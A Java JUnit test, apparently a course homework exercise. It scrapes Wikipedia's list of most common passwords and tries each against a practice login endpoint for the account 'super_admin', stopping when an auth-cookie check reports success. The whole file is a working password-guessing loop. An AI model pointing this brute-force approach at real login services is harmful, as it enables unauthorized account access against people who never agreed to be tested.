import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.*;
import org.jsoup.select.*;

import org.junit.jupiter.api.Test;
import java.io.IOException;
import java.util.*;


public class Task9Pass {

    @Test
    public void testPass() throws IOException {
        String result;

        Map<String, String> data = new HashMap();
        String urlGetCookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String urlCheck = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";


        Document doc = Jsoup.connect("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords").get();
        Elements tablePass = doc.select("#mw-content-text > div.mw-parser-output > table:nth-child(9) > tbody");
        HashSet set = new HashSet();

        Elements passFrom = tablePass.select("td");

        for (Element table : passFrom) {
            set.add(table.select("td").text());
        }

        for (Object pswd : set) {

            data.put("login", "super_admin");
            data.put("password", (String) pswd);

            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post(urlGetCookie)
                    .andReturn();
            //response.prettyPrint();

            String responseCookie = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            //System.out.println(cookies);
            cookies.put("auth_cookie", responseCookie);

            Response resCheck = RestAssured
                    .given()
                    .cookies(cookies)
                    .when()
                    .get(urlCheck)
                    .andReturn();

            result = resCheck.print();

            if (result.equals("You are authorized")) {
                System.out.println("Пароль подобран" + "\n" + pswd);
                break;
            }
        }

    }
}
